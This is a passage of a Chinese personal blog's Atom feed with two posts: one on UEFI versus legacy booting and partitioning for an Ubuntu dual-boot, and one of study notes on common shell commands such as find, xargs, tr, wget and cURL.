    <content type="html"><![CDATA[<h5 id="UEFI和legacy"><a href="#UEFI和legacy" class="headerlink" title="UEFI和legacy"></a>UEFI和legacy</h5><p>闲着那台旧电脑没地方用，然后开机看了看，woc 2G内存 辣鸡AMD处理器 居然。。。win10系统2秒钟开机。。。</p><p>天哪，这就是联想的厉害吗。</p><a id="more"></a><p>然后开始装Ubuntu</p><p>好像我很傻逼。。。</p><p>看了<a href="https://blog.csdn.net/flyyufenfei/article/details/79187656" target="_blank" rel="noopener">这篇博客</a></p><p>才知道，分区要合理的规划。。。Windows下面没这个要求来着？？？</p><blockquote><p>分区的建议:</p><p>/boot - 200MB 实际需求 100~200MB</p><p>/  15~20GB </p><p>/home 存放用户数据，多多益善。</p><p>/swap 可以不用吧</p></blockquote><p>别跑题了，我本来是想探究用UEFI和legacy引导方式的区别的</p><blockquote><p>EFI全称“统一的可扩展固件接口”(Unified Extensible Firmware Interface)， 是一种详细描述类型接口的标准。这种接口用于操作系统自动从预启动的操作环境，加载到一种操作系统上。通俗的说，UEFI是一种新的主板引导初始化的标注设置，具有启动速度快、安全性高和支持大容量硬盘而闻名。出现这种技术的主要作用基本上就是为了实现开机快的效果，由于win8系统支持这种引导方式的启动，所以速度略显的有点快，</p></blockquote><p>上面说的好像不是人话23333</p><p>其实我主要的问题就是</p><p>在我装双系统的时候，为什么legacy是无法引导U盘中的系统的</p><p>只要当我全部启用了UEFI引导的时候才成功了。</p><hr><p>2019年2月3日更新一波</p><h4 id="UEFI"><a href="#UEFI" class="headerlink" title="UEFI"></a>UEFI</h4><p>UEFI 是一种新兴的启动方式， 就是一个特定的分区， 200M左右， 让bios启动的时候直接把引导权限交给这个分区，这样你就可以使用鼠标了，因为传统的legacy模式下只能用键盘， 还可以做到连接无线自动下载镜像安装。</p><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>这就是为什么， 有时候安装Linux需要切换到legacy模式了，然而如果原来的系统是UEFI模式下安装的， 在lagacy模式是进不了的， 因为…bios不知道咋办了， 找不到UEFI</p>]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;UEFI和legacy&quot;&gt;&lt;a href=&quot;#UEFI和legacy&quot; class=&quot;headerlink&quot; title=&quot;UEFI和legacy&quot;&gt;&lt;/a&gt;UEFI和legacy&lt;/h5&gt;&lt;p&gt;闲着那台旧电脑没地方用，然后开机看了看，woc 2G内存 辣鸡AMD处理器 居然。。。win10系统2秒钟开机。。。&lt;/p&gt;
&lt;p&gt;天哪，这就是联想的厉害吗。&lt;/p&gt;
    
    </summary>
    
      <category term="瞎折腾" scheme="https://prontosil.club/categories/%E7%9E%8E%E6%8A%98%E8%85%BE/"/>
    
    
      <category term="UEFI" scheme="https://prontosil.club/tags/UEFI/"/>
    
      <category term="legacy" scheme="https://prontosil.club/tags/legacy/"/>
    
  </entry>
  
  <entry>
    <title>shell脚本</title>
    <link href="https://prontosil.club/2018/12/15/shell%E8%84%9A%E6%9C%AC/"/>
    <id>https://prontosil.club/2018/12/15/shell脚本/</id>
    <published>2018-12-15T15:24:14.000Z</published>
    <updated>2019-02-10T13:38:26.500Z</updated>
    
    <content type="html"><![CDATA[<h4 id="shell命令复习"><a href="#shell命令复习" class="headerlink" title="shell命令复习"></a>shell命令复习</h4><ol><li>ls命令， -l是以详细模式列出文件夹的内容，-a是列出所有内容，包括.开头的文件(all), </li><li>lsbls命令，列出块设备,以标准的的树状格式输出，-l是以列表格式输出显示块设备(lsblk， 可以用来了解新插入的usb设备的名字)</li><li>md5sum，就是计算和检验MD5信息签名</li><li>uname命令，就是unix name命令的缩写，显示机器名和操作系统，内核的详细信息，-a显示详细信息(all)</li><li>history命令就是列出历史纪录</li><li>touch创建文件，或者修改已存在的文件的上一次修改时间</li><li>chmod和chown命令</li><li>cal显示日历和date</li><li>ps命令给出正在运行的某个进程的状态， -A列出所有的进程及其PID</li><li>ps -A | grep -i apache2 </li><li>servive启动某个服务</li></ol><a id="more"></a><blockquote><p>以上是一些常用的命令，下面是一些命令常见的用法</p></blockquote><h5 id="查找命令find"><a href="#查找命令find" class="headerlink" title="查找命令find"></a>查找命令find</h5><p>.代表当前目录， find . -print, 其中print0可以指明使用’\0’作为定界符</p><p>-name 制定了文件名所必须匹配的字符串</p><p>-iname 忽视大小写</p><p>find . \(-name “<em>.txt” -o -name   “\</em>.pdf”\) -print</p><p>find .  -regex “.*(\.py | \.sh\) $ “</p><p>-type 指定搜索的类型，其中d是目录， f是普通文件， l是符号链接</p><p>-atime 用户最近一次访问的时间， -mtime文件内容最后一次被修改时间 ， -ctime 文件元数据最后一次被修改的时间</p><p>+7 代表访问时间超过七天的 7代表访问时间正好是七天， -7代表最近七天内被访问过的所有文件</p><p>同样的还可以用-amin, -mmin, -cmin 分钟做计量单位</p><p>-size 表示文件大小 w k M G 字 千 兆 吉</p><p>-perm 表示权限</p><p>-exec ，实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -user root  -exec  chown XXXX &#123;&#125;\;</span><br><span class="line">find . -type f -name &quot;*.c&quot; -exec cat &#123;&#125;\; &gt; all_c_files.txt</span><br><span class="line">find . -type f -mtime +10 -name &quot;*.txt&quot; -exec cp &#123;&#125; OLD \;</span><br><span class="line">find . -type f -name &quot;*.txt&quot; -exec printf &quot;The file : %s\n&quot; &#123;&#125;\;</span><br></pre></td></tr></table></figure><h5 id="玩转xargs"><a href="#玩转xargs" class="headerlink" title="玩转xargs"></a>玩转xargs</h5><p>cat example.txt | xargs</p><p>将单行输入转化为多行</p><p>cat example.txt | xargs -n 3</p><blockquote><p>结合fing使用xargs</p><p>find . -type f -name “<em>,txt” -print0 | xargs -0 rm -f<br>find dir -type f -name “</em>.c” -print0 | xargs -0 wc -l</p></blockquote><h5 id="tr命令"><a href="#tr命令" class="headerlink" title="tr命令"></a>tr命令</h5><p>tr ‘A-Z’ ‘a-z’</p><p>tr -d ‘[set1]’   指定被删除的字符集合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;hello 1 char 2 next 4 | tr -d -c &apos;0-9&apos; \n&apos;</span><br><span class="line">tr -s &apos; &apos;压缩输入中重复的空白字符</span><br></pre></td></tr></table></figure><h5 id="wget和cURL"><a href="#wget和cURL" class="headerlink" title="wget和cURL"></a>wget和cURL</h5><p>wget URL1 URL2 URL3</p><p>-t 用来指定重复次数</p><p>—limit-rate限速</p><p>—quota或-Q 指定最大下载配额</p><p>-c断点续传</p><p>-O指定下载到的文件名 -o将输出写入日志文件</p><p>cURL URL —silent</p><p>cURL不会讲下载的写入文件，而是写入标准输出</p><p>-O将下载到的内容写入到下载文件</p><p>-o写入指定名称的文件中</p><p>-C断点续传</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;shell命令复习&quot;&gt;&lt;a href=&quot;#shell命令复习&quot; class=&quot;headerlink&quot; title=&quot;shell命令复习&quot;&gt;&lt;/a&gt;shell命令复习&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;ls命令， -l是以详细模式列出文件夹的内容，-a是列出所有内容，包括.开头的文件(all), &lt;/li&gt;
&lt;li&gt;lsbls命令，列出块设备,以标准的的树状格式输出，-l是以列表格式输出显示块设备(lsblk， 可以用来了解新插入的usb设备的名字)&lt;/li&gt;
&lt;li&gt;md5sum，就是计算和检验MD5信息签名&lt;/li&gt;
&lt;li&gt;uname命令，就是unix name命令的缩写，显示机器名和操作系统，内核的详细信息，-a显示详细信息(all)&lt;/li&gt;
&lt;li&gt;history命令就是列出历史纪录&lt;/li&gt;
&lt;li&gt;touch创建文件，或者修改已存在的文件的上一次修改时间&lt;/li&gt;
&lt;li&gt;chmod和chown命令&lt;/li&gt;
&lt;li&gt;cal显示日历和date&lt;/li&gt;
&lt;li&gt;ps命令给出正在运行的某个进程的状态， -A列出所有的进程及其PID&lt;/li&gt;
&lt;li&gt;ps -A | grep -i apache2 &lt;/li&gt;
&lt;li&gt;servive启动某个服务&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://prontosil.club/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://prontosil.club/tags/Linux/"/>
    
      <category term="shell" scheme="https://prontosil.club/tags/shell/"/>
    
  </entry>
  
</feed>
